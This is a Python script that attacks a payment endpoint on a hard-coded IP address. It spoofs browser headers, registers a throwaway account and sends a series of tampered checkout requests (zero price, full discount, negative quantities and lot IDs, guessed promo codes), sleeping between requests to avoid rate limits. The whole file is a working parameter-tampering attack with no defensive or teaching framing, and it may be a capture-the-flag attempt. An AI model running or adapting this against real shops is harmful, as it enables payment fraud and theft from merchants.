import requests
import re
import time

base_url = "http://155.212.216.201:8080"
s = requests.Session()
ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
s.headers.update({
    "User-Agent": ua,
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "X-Requested-With": "mk",
})

# Register a fresh user
uname = f"user_{int(time.time())}"
s.post(f"{base_url}/register", data={"username": uname, "password": "Password123!"})

# Test pay with various parameter tampering
tests = [
    {"lot": 13537, "price": 0},
    {"lot": 13537, "price": 100},
    {"lot": 13537, "discount": 100},
    {"lot": 13537, "discount": 99.9},
    {"lot": 13537, "total": 0},
    {"lot": 13537, "amount": 0},
    {"lot": 13537, "paid": 250000},
    {"lot": 13537, "promo": "WELCOME5"},
    {"lot": 13537, "code": "WELCOME5"},
    {"lot": -13537},
    {"lot": 13537, "qty": -1},
    {"lot": 13537, "count": -1},
]

for t in tests:
    time.sleep(1.2) # Avoid rate limit
    r = s.post(f"{base_url}/api/v2/checkout/pay", json=t)
    print(f"Pay with {t}: status {r.status_code}, resp: {r.text}")
